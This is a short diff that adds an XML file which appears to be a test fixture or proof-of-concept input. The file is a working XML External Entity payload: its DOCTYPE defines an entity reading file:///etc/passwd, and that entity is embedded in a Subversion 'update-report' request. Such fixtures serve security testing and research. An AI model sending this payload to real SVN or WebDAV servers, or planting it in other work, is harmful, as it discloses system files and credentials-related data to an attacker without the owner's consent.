@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<S:update-report xmlns:S="svn:" send-all="true"><S:target-revision rev="1"/>&xxe;</S:update-report>
